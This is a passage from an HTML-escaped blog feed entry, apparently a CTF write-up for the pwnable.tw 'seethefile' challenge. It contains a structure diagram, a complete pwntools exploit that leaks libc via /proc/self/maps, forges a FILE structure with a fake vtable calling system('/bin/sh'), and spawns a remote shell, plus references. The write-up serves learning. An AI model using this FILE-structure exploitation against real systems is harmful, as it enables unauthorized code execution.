clip-path=&quot;url(#mx-clip-574-346-162-41-0)&quot; text-anchor=&quot;middle&quot; font-size=&quot;13.999999999999998px&quot;&gt;&lt;text x=&quot;654.5&quot; y=&quot;371.89&quot;&gt;0x804b260 (name)&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 570 386.28 L 740 386.28&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 570 366.37 L 540.05 366.37 L 540.05 26.05 L 566.91 26&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 561.04 29.51 L 568.03 25.99 L 561.02 22.51&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 349 765.75 L 360.05 765.84 L 360.05 666.05 L 550.05 666.05 L 550.05 766.05 L 565.76 766.01&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; stroke-dasharray=&quot;2.9999999999999996 2.9999999999999996&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 559.89 769.52 L 566.88 766 L 559.87 762.52&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 160 803.53 L 179.95 803.53 L 179.95 916.05 L 550.05 916.05 L 550.05 805 L 567.76 805.04&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; stroke-dasharray=&quot;2.9999999999999996 2.9999999999999996&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 561.87 808.53 L 568.88 805.04 L 561.89 801.53&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 374 747 L 374 721 L 534 721 L 534 747&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 374 747 L 374 905 L 534 905 L 534 747&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 374 747 L 534 747&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-weight=&quot;bold&quot; text-anchor=&quot;middle&quot; font-size=&quot;10.999999999999998px&quot;&gt;&lt;text x=&quot;453.5&quot; y=&quot;738&quot;&gt;_IO_jump_t&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-378-747-152-34-0)&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;379.5&quot; y=&quot;768.25&quot;&gt;void* __dummy&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 374 784.5 L 534 784.5&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-378-788-152-34-0)&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;379.5&quot; y=&quot;809.75&quot;&gt;void* __dummy2&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 374 826 L 534 826&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-378-830-152-34-0)&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;379.5&quot; y=&quot;851.25&quot;&gt;void* __finish&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 374 867.5 L 534 867.5&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;g fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; clip-path=&quot;url(#mx-clip-378-871-152-34-0)&quot; font-size=&quot;11.999999999999998px&quot;&gt;&lt;text x=&quot;379.5&quot; y=&quot;892.75&quot;&gt;...&lt;&#x2F;text&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 534 846.75 L 534.05 843 L 560.05 843 L 567.77 842.73&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; stroke-dasharray=&quot;0.9999999999999999 0.9999999999999999&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;path d=&quot;M 562.01 846.43 L 568.88 842.7 L 561.77 839.44&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;none&quot;&#x2F;&gt;&lt;&#x2F;g&gt;&lt;switch&gt;&lt;g requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&#x2F;&gt;&lt;a transform=&quot;translate(0,-5)&quot; xlink:href=&quot;https:&#x2F;&#x2F;desk.draw.io&#x2F;support&#x2F;solutions&#x2F;articles&#x2F;16000042487&quot; target=&quot;_blank&quot;&gt;&lt;text text-anchor=&quot;middle&quot; font-size=&quot;10px&quot; x=&quot;50%&quot; y=&quot;100%&quot;&gt;Viewer does not support full SVG 1.1&lt;&#x2F;text&gt;&lt;&#x2F;a&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;svg&gt;
&lt;h2 id=&quot;final-script&quot;&gt;Final Script&lt;&#x2F;h2&gt;
&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;pwn &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;*

&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;context.binary &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.&#x2F;seethefile&amp;#39;

&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;elf &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ELF(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.&#x2F;seethefile&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
libc &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ELF(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.&#x2F;libc_32.so.6&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)

r &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;remote(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;chall.pwnable.tw&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;10200&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)

&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;openfile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(path):
        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;choice :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
        r.sendline(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;1&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;see :&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
        r.sendline(path)

&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;readfile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;():
        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;choice :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
        r.sendline(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;2&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)

&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;writefile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;():
        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;choice :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
        r.sendline(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;3&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;---------------MENU---------------&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)[:&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;---------------MENU---------------&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)]

&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;closefile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;():
        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;choice :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
        r.sendline(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;4&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)

&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(name):
        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;choice :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
        r.sendline(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;5&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;name :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
        r.sendline(name)

openfile(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&#x2F;proc&#x2F;self&#x2F;maps&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
readfile()
readfile()

libc.address &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;([x.split(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;-&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;writefile().split(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;x.endswith(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.so&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)][&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;], &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)

info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Found libc base &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(libc.address))
info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Address of system &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(libc.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;system&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;]))

file &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&amp;quot;                                       &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# file
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;file &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0xFFFFDFFF&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)                         &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# file-&amp;gt;_flags  set _IO_IS_FILEBUF bit to false
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;file &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;;&#x2F;bin&#x2F;sh;&amp;quot;                             &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# file-&amp;gt;???     to be interpreted as a string

&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;file.ljust(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;A&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)                   &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# padding to reach *fp
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(elf.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;name&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;])             &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# *fp           overwrite *fp to point to the start of the name buffer
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;`&amp;#39;                                  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# padding
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;A&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;72&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;37&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)                        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# padding
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(elf.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;filename&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# file-&amp;gt;_lock   vtable-&amp;gt;__dummy
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(elf.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;name&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;72&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# file-&amp;gt;vtable  vtable-&amp;gt;__dummy2
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(libc.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;system&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;])          &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;#               vtable-&amp;gt;__finish

&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;exit(payload)

r.interactive()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Running this gives us a shell on the remote server:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;posts&#x2F;pwnable-tw-seethefile&#x2F;5e81ac654304800866d6917d.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;further-reading&quot;&gt;Further Reading&lt;&#x2F;h1&gt;
&lt;p&gt;These are some resources I found helpful while solving this challenge.&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;elixir.bootlin.com&#x2F;glibc&#x2F;glibc-2.23&#x2F;source&quot;&gt;https:&#x2F;&#x2F;elixir.bootlin.com&#x2F;glibc&#x2F;glibc-2.23&#x2F;source&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.slideshare.net&#x2F;AngelBoy1&#x2F;play-with-file-structure-yet-another-binary-exploit-technique&quot;&gt;https:&#x2F;&#x2F;www.slideshare.net&#x2F;AngelBoy1&#x2F;play-with-file-structure-yet-another-binary-exploit-technique&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;gsec.hitb.org&#x2F;materials&#x2F;sg2018&#x2F;WHITEPAPERS&#x2F;FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf&quot;&gt;https:&#x2F;&#x2F;gsec.hitb.org&#x2F;materials&#x2F;sg2018&#x2F;WHITEPAPERS&#x2F;FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
	</entry>
</feed>
